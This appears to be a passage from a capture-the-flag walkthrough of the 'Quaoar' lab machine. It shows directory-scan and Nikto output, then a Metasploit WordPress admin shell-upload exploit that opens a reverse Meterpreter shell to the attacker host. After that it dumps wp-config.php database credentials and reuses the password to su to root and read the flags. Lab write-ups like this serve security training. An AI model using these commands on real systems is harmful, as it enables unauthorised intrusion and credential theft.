+ http://192.168.100.101/upload/modules/news/rss (CODE:302|SIZE:0)                                                                                                                                                
+ http://192.168.100.101/upload/modules/news/search (CODE:403|SIZE:85)                                                                                                                                            
==> DIRECTORY: http://192.168.100.101/upload/modules/news/templates/                                                                                                                                              
+ http://192.168.100.101/upload/modules/news/uninstall (CODE:403|SIZE:88)                                                                                                                                         
+ http://192.168.100.101/upload/modules/news/upgrade (CODE:403|SIZE:86)                                                                                                                                           
+ http://192.168.100.101/upload/modules/news/view (CODE:403|SIZE:83)                                                                                                                                              
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/modules/wysiwyg/ ----
+ http://192.168.100.101/upload/modules/wysiwyg/add (CODE:403|SIZE:85)                                                                                                                                            
+ http://192.168.100.101/upload/modules/wysiwyg/delete (CODE:403|SIZE:88)                                                                                                                                         
+ http://192.168.100.101/upload/modules/wysiwyg/icon (CODE:200|SIZE:1058)                                                                                                                                         
+ http://192.168.100.101/upload/modules/wysiwyg/index (CODE:302|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/upload/modules/wysiwyg/index.php (CODE:302|SIZE:0)                                                                                                                                       
+ http://192.168.100.101/upload/modules/wysiwyg/info (CODE:403|SIZE:86)                                                                                                                                           
+ http://192.168.100.101/upload/modules/wysiwyg/info.php (CODE:403|SIZE:86)                                                                                                                                       
+ http://192.168.100.101/upload/modules/wysiwyg/install (CODE:403|SIZE:89)                                                                                                                                        
==> DIRECTORY: http://192.168.100.101/upload/modules/wysiwyg/languages/                                                                                                                                           
+ http://192.168.100.101/upload/modules/wysiwyg/modify (CODE:403|SIZE:88)                                                                                                                                         
+ http://192.168.100.101/upload/modules/wysiwyg/save (CODE:302|SIZE:0)                                                                                                                                            
+ http://192.168.100.101/upload/modules/wysiwyg/search (CODE:403|SIZE:88)                                                                                                                                         
==> DIRECTORY: http://192.168.100.101/upload/modules/wysiwyg/templates/                                                                                                                                           
+ http://192.168.100.101/upload/modules/wysiwyg/upgrade (CODE:403|SIZE:89)                                                                                                                                        
+ http://192.168.100.101/upload/modules/wysiwyg/view (CODE:403|SIZE:86)                                                                                                                                           
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/page/posts/ ----
+ http://192.168.100.101/upload/page/posts/index (CODE:302|SIZE:0)                                                                                                                                                
+ http://192.168.100.101/upload/page/posts/index.php (CODE:302|SIZE:0)                                                                                                                                            
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/temp/search/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/templates/blank/ ----
+ http://192.168.100.101/upload/templates/blank/index (CODE:302|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/upload/templates/blank/index.php (CODE:302|SIZE:0)                                                                                                                                       
+ http://192.168.100.101/upload/templates/blank/info (CODE:403|SIZE:86)                                                                                                                                           
+ http://192.168.100.101/upload/templates/blank/info.php (CODE:403|SIZE:86)                                                                                                                                       
+ http://192.168.100.101/upload/templates/blank/preview (CODE:200|SIZE:1377)                                                                                                                                      
+ http://192.168.100.101/upload/templates/blank/template (CODE:200|SIZE:507)                                                                                                                                      
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-admin/network/ ----
+ http://192.168.100.101/wordpress/wp-admin/network/about (CODE:302|SIZE:0)                                                                                                                                       
+ http://192.168.100.101/wordpress/wp-admin/network/admin (CODE:302|SIZE:0)                                                                                                                                       
+ http://192.168.100.101/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                                                                                   
+ http://192.168.100.101/wordpress/wp-admin/network/credits (CODE:302|SIZE:0)                                                                                                                                     
+ http://192.168.100.101/wordpress/wp-admin/network/edit (CODE:302|SIZE:0)                                                                                                                                        
+ http://192.168.100.101/wordpress/wp-admin/network/index (CODE:302|SIZE:0)                                                                                                                                       
+ http://192.168.100.101/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                                                                                   
+ http://192.168.100.101/wordpress/wp-admin/network/menu (CODE:500|SIZE:0)                                                                                                                                        
+ http://192.168.100.101/wordpress/wp-admin/network/plugins (CODE:302|SIZE:0)                                                                                                                                     
+ http://192.168.100.101/wordpress/wp-admin/network/profile (CODE:302|SIZE:0)                                                                                                                                     
+ http://192.168.100.101/wordpress/wp-admin/network/settings (CODE:302|SIZE:0)                                                                                                                                    
+ http://192.168.100.101/wordpress/wp-admin/network/setup (CODE:302|SIZE:0)                                                                                                                                       
+ http://192.168.100.101/wordpress/wp-admin/network/sites (CODE:302|SIZE:0)                                                                                                                                       
+ http://192.168.100.101/wordpress/wp-admin/network/themes (CODE:302|SIZE:0)                                                                                                                                      
+ http://192.168.100.101/wordpress/wp-admin/network/update (CODE:302|SIZE:0)                                                                                                                                      
+ http://192.168.100.101/wordpress/wp-admin/network/upgrade (CODE:302|SIZE:0)                                                                                                                                     
+ http://192.168.100.101/wordpress/wp-admin/network/users (CODE:302|SIZE:0)                                                                                                                                       
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-admin/user/ ----
+ http://192.168.100.101/wordpress/wp-admin/user/about (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/wordpress/wp-admin/user/admin (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                                                                                      
+ http://192.168.100.101/wordpress/wp-admin/user/credits (CODE:302|SIZE:0)                                                                                                                                        
+ http://192.168.100.101/wordpress/wp-admin/user/index (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                                                                                      
+ http://192.168.100.101/wordpress/wp-admin/user/menu (CODE:500|SIZE:0)                                                                                                                                           
+ http://192.168.100.101/wordpress/wp-admin/user/profile (CODE:302|SIZE:0)                                                                                                                                        
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-content/plugins/ ----
+ http://192.168.100.101/wordpress/wp-content/plugins/hello (CODE:500|SIZE:0)                                                                                                                                     
+ http://192.168.100.101/wordpress/wp-content/plugins/index (CODE:200|SIZE:0)                                                                                                                                     
+ http://192.168.100.101/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                                                                                                 
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-content/themes/ ----
+ http://192.168.100.101/wordpress/wp-content/themes/index (CODE:200|SIZE:0)                                                                                                                                      
+ http://192.168.100.101/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                                                                                                                  
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/admins/login/forgot/ ----
+ http://192.168.100.101/upload/admins/login/forgot/index (CODE:200|SIZE:2531)                                                                                                                                    
+ http://192.168.100.101/upload/admins/login/forgot/index.php (CODE:200|SIZE:2531)                                                                                                                                
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/include/yui/event/ ----
+ http://192.168.100.101/upload/include/yui/event/event (CODE:200|SIZE:87537)                                                                                                                                     
+ http://192.168.100.101/upload/include/yui/event/index (CODE:302|SIZE:0)                                                                                                                                         
+ http://192.168.100.101/upload/include/yui/event/index.php (CODE:302|SIZE:0)                                                                                                                                     
+ http://192.168.100.101/upload/include/yui/event/README (CODE:200|SIZE:9807)                                                                                                                                     
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/include/yui/yahoo/ ----
+ http://192.168.100.101/upload/include/yui/yahoo/index (CODE:302|SIZE:0)                                                                                                                                         
+ http://192.168.100.101/upload/include/yui/yahoo/index.php (CODE:302|SIZE:0)                                                                                                                                     
+ http://192.168.100.101/upload/include/yui/yahoo/README (CODE:200|SIZE:2889)                                                                                                                                     
+ http://192.168.100.101/upload/include/yui/yahoo/yahoo (CODE:200|SIZE:35223)                                                                                                                                     
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/modules/news/css/ ----
+ http://192.168.100.101/upload/modules/news/css/backend (CODE:200|SIZE:1416)                                                                                                                                     
+ http://192.168.100.101/upload/modules/news/css/frontend (CODE:200|SIZE:1771)                                                                                                                                    
+ http://192.168.100.101/upload/modules/news/css/index (CODE:302|SIZE:0)                                                                                                                                          
+ http://192.168.100.101/upload/modules/news/css/index.php (CODE:302|SIZE:0)                                                                                                                                      
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/modules/news/languages/ ----
+ http://192.168.100.101/upload/modules/news/languages/index (CODE:302|SIZE:0)                                                                                                                                    
+ http://192.168.100.101/upload/modules/news/languages/index.php (CODE:302|SIZE:0)                                                                                                                                
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/modules/news/templates/ ----
==> DIRECTORY: http://192.168.100.101/upload/modules/news/templates/backend/                                                                                                                                      
+ http://192.168.100.101/upload/modules/news/templates/index (CODE:302|SIZE:0)                                                                                                                                    
+ http://192.168.100.101/upload/modules/news/templates/index.php (CODE:302|SIZE:0)                                                                                                                                
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/modules/wysiwyg/languages/ ----
+ http://192.168.100.101/upload/modules/wysiwyg/languages/index (CODE:302|SIZE:0)                                                                                                                                 
+ http://192.168.100.101/upload/modules/wysiwyg/languages/index.php (CODE:302|SIZE:0)                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/modules/wysiwyg/templates/ ----
+ http://192.168.100.101/upload/modules/wysiwyg/templates/index (CODE:302|SIZE:0)                                                                                                                                 
+ http://192.168.100.101/upload/modules/wysiwyg/templates/index.php (CODE:302|SIZE:0)                                                                                                                             
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.100.101/upload/modules/news/templates/backend/ ----
+ http://192.168.100.101/upload/modules/news/templates/backend/index (CODE:302|SIZE:0)                                                                                                                            
+ http://192.168.100.101/upload/modules/news/templates/backend/index.php (CODE:302|SIZE:0)                                                                                                                        
                                                                                                                                                                                                                  
-----------------
END_TIME: Fri May  5 09:33:59 2017
DOWNLOADED: 258272 - FOUND: 252
root@kali:~# 
```

Nikto
```bash
root@kali:~# nikto -h http://192.168.100.101
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.100.101
+ Target Hostname:    192.168.100.101
+ Target Port:        80
+ Start Time:         2017-05-05 10:37:49 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, inode: 133975, size: 100, mtime: Mon Oct 24 06:00:10 2016
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3
+ Entry '/wordpress/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wordpress/: A Wordpress installation was found.
+ 8348 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2017-05-05 10:38:23 (GMT2) (34 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# 
```

Testing wordpress vulnerability based on version indicated by nikto and default username:password (admin:admin)
```bash
root@kali:~# msfconsole -q -x "use exploit/unix/webapp/wp_admin_shell_upload; set PASSWORD admin; set RHOST 192.168.100.101; set TARGETURI /wordpress; set USERNAME admin; exploit;"
PASSWORD => admin
RHOST => 192.168.100.101
TARGETURI => /wordpress
USERNAME => admin
[*] Started reverse TCP handler on 192.168.100.102:4444 
[*] Authenticating with WordPress using admin:admin...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wordpress/wp-content/plugins/MzwItnFywI/ZEAQpbofwe.php...
[*] Sending stage (33986 bytes) to 192.168.100.101
[*] Meterpreter session 1 opened (192.168.100.102:4444 -> 192.168.100.101:51083) at 2017-05-05 09:40:45 +0200
[+] Deleted ZEAQpbofwe.php
[+] Deleted MzwItnFywI.php

meterpreter > 
```

Enumeration
```bash
meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : Quaoar
OS          : Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686
Meterpreter : php/linux
meterpreter >
meterpreter > ls
No entries exist in /var/www/wordpress/wp-content/plugins/MzwItnFywI
meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2016-10-22 18:53:38 +0200  wpadmin

meterpreter > cd wpadmin
meterpreter > ls
Listing: /home/wpadmin
======================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  33    fil   2016-10-22 18:54:00 +0200  flag.txt

meterpreter > cat flag.txt
2bafe61f03117ac66a73c3c514de796e
meterpreter > 
```

Wordpress enumeration
```bash
meterpreter > pwd
/var/www/wordpress/wp-admin
meterpreter > cd ..
meterpreter > ls
Listing: /var/www/wordpress
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  418    fil   2016-10-27 02:45:26 +0200  index.php
100644/rw-r--r--  19930  fil   2016-10-27 02:45:26 +0200  license.txt
100644/rw-r--r--  7195   fil   2016-10-27 02:45:26 +0200  readme.html
100644/rw-r--r--  4896   fil   2016-10-27 02:45:26 +0200  wp-activate.php
40755/rwxr-xr-x   4096   dir   2016-10-27 02:45:26 +0200  wp-admin
100644/rw-r--r--  271    fil   2016-10-27 02:45:26 +0200  wp-blog-header.php
100644/rw-r--r--  4818   fil   2016-10-27 02:45:26 +0200  wp-comments-post.php
100644/rw-r--r--  3087   fil   2016-10-27 02:45:26 +0200  wp-config-sample.php
100666/rw-rw-rw-  3441   fil   2016-11-30 06:02:01 +0100  wp-config.php
40755/rwxr-xr-x   4096   dir   2017-05-05 12:46:48 +0200  wp-content
100644/rw-r--r--  2932   fil   2016-10-27 02:45:26 +0200  wp-cron.php
40755/rwxr-xr-x   4096   dir   2016-10-27 02:45:26 +0200  wp-includes
100644/rw-r--r--  2380   fil   2016-10-27 02:45:26 +0200  wp-links-opml.php
100644/rw-r--r--  2359   fil   2016-10-27 02:45:26 +0200  wp-load.php
100644/rw-r--r--  33609  fil   2016-10-27 02:45:26 +0200  wp-login.php
100644/rw-r--r--  8235   fil   2016-10-27 02:45:26 +0200  wp-mail.php
100644/rw-r--r--  11070  fil   2016-10-27 02:45:26 +0200  wp-settings.php
100644/rw-r--r--  25665  fil   2016-10-27 02:45:26 +0200  wp-signup.php
100644/rw-r--r--  4026   fil   2016-10-27 02:45:26 +0200  wp-trackback.php
100644/rw-r--r--  3032   fil   2016-10-27 02:45:26 +0200  xmlrpc.php

meterpreter > cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'rootpassword!');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
/** */
define('WP_HOME','/wordpress/');
define('WP_SITEURL','/wordpress/');
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '`47hAs4ic+mLDn[-PH(7t+Q+J)L=8^ 8&z!F ?Tu4H#JlV7Ht4}Fsdbg2us1wZZc');
define('SECURE_AUTH_KEY',  'g#vFXk!k|3,w30.VByn8+D-}-P(]c1oI|&BfmQqq{)5w)B>$?5t}5u&s)#K1@{%d');
define('LOGGED_IN_KEY',    '[|;!?pt}0$ei+>sS9x+B&$iV~N+3Cox-C5zT|,P-<0YsX6-RjNA[WTz-?@<F[O@T');
define('NONCE_KEY',        '7RFLj2-NFkAjb6UsKvnN+1aj<Vm++P9<D~H+)l;|5?P1*?gi%o1&zKaXa<]Ft#++');
define('AUTH_SALT',        'PN9aE9`#7.uL|W8}pGsW$,:h=Af(3h52O!w#IWa|u4zfouV @J@Y_GoC8)ApSKeN');
define('SECURE_AUTH_SALT', 'wGh|W wNR-(p6fRjV?wb$=f4*KkMM<j0)H#Qz-tu.r~2O*Xs9W3^_`c6Md+ptRR.');
define('LOGGED_IN_SALT',   '+36M1E5.MC;-k:[[_bs>~a0o_c$v?ok4LR|17 ]!K:Z8-]lcSs?EXC`TO;X3in[#');
define('NONCE_SALT',       'K=Sf5{EDu3rG&x=#em=R}:-m+IRNs<@4e8P*)GF#+x+,zu.D8Ksy?j+_]/Kcn|cn');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', '');

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

meterpreter > 
```

Trying same password to get root
```bash
meterpreter > shell
Process 2503 created.
Channel 0 created.
su root
su: must be run from a terminal
python -c 'import pty; pty.spawn("/bin/sh")'
$ su root
su root
Password: rootpassword!

root@Quaoar:/var/www/wordpress/wp-content/plugins/WqIvKjrkRn# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Quaoar:/var/www/wordpress/wp-content/plugins/WqIvKjrkRn# cd /root
cd /root
root@Quaoar:~# ls
ls
flag.txt  vmware-tools-distrib
root@Quaoar:~# cat flag.txt
cat flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb
root@Quaoar:~# 
```
